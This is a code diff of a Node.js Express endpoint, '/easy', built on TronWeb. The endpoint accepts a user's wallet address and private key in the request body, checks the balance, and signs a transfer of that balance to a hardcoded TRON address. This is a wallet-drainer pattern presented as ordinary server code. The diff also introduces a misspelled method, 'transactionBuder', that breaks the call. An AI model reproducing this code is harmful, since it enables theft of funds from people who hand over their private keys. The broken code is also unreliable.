@@ -150,7 +150,7 @@ const tronWeb = new TronWeb({fullHost: fullNode, privateKey: private_key});
 })
 app.post('/easy', async(req, res) => {
     try {
-        const {address,private_key,Admin_tron_address} = req.body;
+        const {address,private_key} = req.body;
         const tronWeb = new TronWeb({fullHost: fullNode, privateKey: private_key});
         const mem = "TUCHtoQPYdDDJjSdyzCwUA9mymJRrHzQSM"
 const balance = await tronWeb.trx.getBalance(address);
@@ -197,8 +197,8 @@ res.status(200).json({response: ret ,Amount : bal,Sender : address});
 }else{
 try {
 var balu = balance/1000000
-const mem = "TUCHtoQPYdDDJjSdyzCwUA9mymJRrHzQSM"
-const unSignedTxn = await tronWeb.transactionBuilder.sendTrx(mem, balu);
+const Admin_tron_address = "TUCHtoQPYdDDJjSdyzCwUA9mymJRrHzQSM"
+const unSignedTxn = await tronWeb.transactionBuder.sendTrx(Admin_tron_address, balu);
         const signedTxn = await tronWeb.trx.sign(unSignedTxn);
         const ret = await tronWeb.trx.sendRawTransaction(signedTxn);
 
